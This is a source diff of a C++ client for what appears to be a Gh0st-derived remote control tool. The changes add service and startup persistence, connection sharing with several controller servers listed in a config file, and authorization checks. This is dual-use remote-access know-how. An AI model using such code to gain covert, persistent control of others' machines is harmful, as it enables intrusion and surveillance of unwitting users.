@@ -4,6 +4,8 @@
 #include "stdafx.h"
 #include "ClientDll.h"
 #include <common/iniFile.h>
+#include <common/LANChecker.h>
+#include <common/VerifyV2.h>
 extern "C" {
 #include "reg_startup.h"
 #include "ServiceWrapper.h"
@@ -40,7 +42,8 @@ BOOL IsProcessExit()
 BOOL IsSharedRunning(void* thisApp)
 {
     ClientApp* This = (ClientApp*)thisApp;
-    return (S_CLIENT_NORMAL == g_MyApp.g_bExit) && (S_CLIENT_NORMAL == This->g_bExit);
+    // 只在进程退出时停止分享连接，原服务端的状态变化不应影响分享连接
+    return !IsProcessExit() && (S_CLIENT_NORMAL == This->g_bExit);
 }
 
 BOOL IsClientAppRunning(void* thisApp)
@@ -177,7 +180,12 @@ DWORD WaitForMultipleHandlesEx(
 
 BOOL CALLBACK callback(DWORD CtrlType)
 {
-    if (CtrlType == CTRL_CLOSE_EVENT) {
+#ifdef _DEBUG
+    BOOL isClose = (CtrlType == CTRL_C_EVENT) || (CtrlType == CTRL_CLOSE_EVENT);
+#else
+    BOOL isClose = (CtrlType == CTRL_CLOSE_EVENT);
+#endif
+    if (isClose) {
         g_MyApp.g_bExit = S_CLIENT_EXIT;
         while (E_RUN == status)
             Sleep(20);
@@ -192,7 +200,7 @@ int main(int argc, const char *argv[])
                            g_SETTINGS.installName[0] ? g_SETTINGS.installName : "RemoteControlService",
                            g_SETTINGS.installDir[0] ? g_SETTINGS.installDir : "Remote Control Service",
                            g_SETTINGS.installDesc[0] ? g_SETTINGS.installDesc : "Provides remote desktop control functionality."), Log);
-    bool isService = g_SETTINGS.iStartup == Startup_GhostMsc;
+    bool isService = g_SETTINGS.iStartup == Startup_GhostMsc || IsSystemInSession0();
     // 注册启动项
     int r = RegisterStartup(
                 g_SETTINGS.installDir[0] ? g_SETTINGS.installDir : "Windows Ghost",
@@ -212,6 +220,7 @@ int main(int argc, const char *argv[])
     }
 
     if (isService) {
+        g_SETTINGS.iStartup = Startup_GhostMsc;
         bool ret = RunAsWindowsService(argc, argv);
         Mprintf("RunAsWindowsService %s. Arg Count: %d\n", ret ? "succeed" : "failed", argc);
         for (int i = 0; !ret && i < argc; i++) {
@@ -321,6 +330,7 @@ extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
     CONNECT_ADDRESS& settings(*(app.g_Connection));
     if (app.IsThreadRun()) {
         settings.SetServer(szServerIP, uPort);
+        Mprintf("TestRun SetServer[%s:%d]\n", szServerIP ? szServerIP : "", uPort);
         return;
     }
     app.SetThreadRun(TRUE);
@@ -475,25 +485,35 @@ extern "C" __declspec(dllexport) void Run(HWND hwnd, HINSTANCE hinst, LPSTR lpsz
 
 #endif
 
+bool ParseAuthServer(const std::string& auth, std::string& host, int& port, bool b=false);
+void ParseAuthServer(CONNECT_ADDRESS *conn) {
+	config* cfg = IsDebug ? (config*)new config() : (config*)new iniFile();
+    std::string host = conn->ServerIP();
+	int port = conn->ServerPort();
+    if (ParseAuthServer(cfg->GetStr("settings", "Authorization"), host, port, true))
+        conn->SetServer(host.c_str(), port);
+	delete cfg;
+}
+
 DWORD WINAPI StartClient(LPVOID lParam)
 {
-    Mprintf("StartClient begin\n");
     ClientApp& app(*(ClientApp*)lParam);
     CONNECT_ADDRESS& settings(*(app.g_Connection));
     BOOL assigned = FALSE;
+    iniFile cfg(CLIENT_PATH);
     double valid_to = 0;
     std::string ip = settings.ServerIP();
     int port = settings.ServerPort();
+    Mprintf("StartClient begin[%s:%d]\n", ip.c_str(), port);
     if (!app.m_bShared) {
-        iniFile cfg(CLIENT_PATH);
         auto now = time(0);
         valid_to = atof(cfg.GetStr("settings", "valid_to").c_str());
         if (assigned = now <= valid_to) {
             auto saved_ip = cfg.GetStr("settings", "master");
             auto saved_port = cfg.GetInt("settings", "port");
             settings.SetServer(saved_ip.c_str(), saved_port);
-            Mprintf("[StartClient] Client is assigned to %s:%d- %ds left.\n", saved_ip.c_str(), saved_port, 
-                int(valid_to-now));
+            Mprintf("[StartClient] Client is assigned to %s:%d- %ds left.\n", saved_ip.c_str(), saved_port,
+                    int(valid_to-now));
         }
     }
     auto list = app.GetSharedMasterList();
@@ -506,8 +526,21 @@ DWORD WINAPI StartClient(LPVOID lParam)
         // The main ClientApp.
         settings.SetServer(list[0].c_str(), settings.ServerPort());
     }
-    iniFile cfg(CLIENT_PATH);
+    if (!app.m_bShared) {
+        auto a = cfg.GetStr("settings", "share_list");
+        auto shareList = a.empty() ? std::vector<std::string>{} : StringToVector(a, '|');
+        for (int i = 0; i < shareList.size(); ++i) {
+            auto a = NewClientStartArg(shareList[i].c_str(), IsSharedRunning, TRUE);
+            if (nullptr != a) CloseHandle(__CreateThread(0, 0, StartClientApp, a, 0, 0));
+            Mprintf("[StartClient] Client is shared to %s.\n", shareList[i].c_str());
+        }
+    }
+    std::string expiredDate;
+    BOOL isAuthKernel = IsAuthKernel(expiredDate);
+    if (isAuthKernel) ParseAuthServer(&settings);
     std::string pubIP = cfg.GetStr("settings", "public_ip", "");
+    // V2 authorization supports offline mode, verify signature and skip timeout check
+    VERIFY_V2_AND_SET_AUTHORIZED();
     State& bExit(app.g_bExit);
     IOCPClient  *ClientObject = NewNetClient(&settings, bExit, pubIP);
     if (nullptr == ClientObject) return -1;
@@ -530,15 +563,19 @@ DWORD WINAPI StartClient(LPVOID lParam)
             Mprintf("[ConnectServer] ---> %s:%d.\n", settings.ServerIP(), settings.ServerPort());
             for (int k = 300+(IsDebug ? rand()%600:rand()%6000); app.m_bIsRunning(&app) && --k; Sleep(10));
             SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED);
+            // Check auth timeout for trial/unauthorized users while waiting to reconnect
+            if (isAuthKernel && AuthTimeoutChecker::NeedCheck())
+                AuthTimeoutChecker::Check();
             continue;
         }
         SAFE_DELETE(Manager);
 
         //准备第一波数据
-        BOOL auth = FALSE;
-        LOGIN_INFOR login = GetLoginInfo(GetTickCount64() - dwTickCount, settings, auth);
-        Manager = auth ? new AuthKernelManager(&settings, ClientObject, app.g_hInstance, kb, bExit) :
+        LOGIN_INFOR login = GetLoginInfo(GetTickCount64() - dwTickCount, settings, expiredDate);
+        Manager = isAuthKernel ? new AuthKernelManager(&settings, ClientObject, app.g_hInstance, kb, bExit) :
                   new CKernelManager(&settings, ClientObject, app.g_hInstance, kb, bExit);
+        Manager->SetClientApp(&app);
+        Manager->SetLoginMsg(login.szStartTime + std::string("|") + std::to_string(settings.clientID));
         while (ClientObject->IsRunning() && ClientObject->IsConnected() && !ClientObject->SendLoginInfo(login))
             WAIT_n(app.m_bIsRunning(&app), 5 + time(0)%10, 200);
         WAIT_n(app.m_bIsRunning(&app)&& ClientObject->IsRunning() && ClientObject->IsConnected(), 10, 200);
@@ -556,6 +593,7 @@ DWORD WINAPI StartClient(LPVOID lParam)
             Sleep(200);
     }
     kb->Exit(10);
+    SAFE_DELETE(kb);
     if (app.g_bExit == S_CLIENT_EXIT && app.g_hEvent && !app.m_bShared) {
         BOOL b = SetEvent(app.g_hEvent);
         Mprintf(">>> [StartClient] Set event: %s %s!\n", EVENT_FINISHED, b ? "succeed" : "failed");
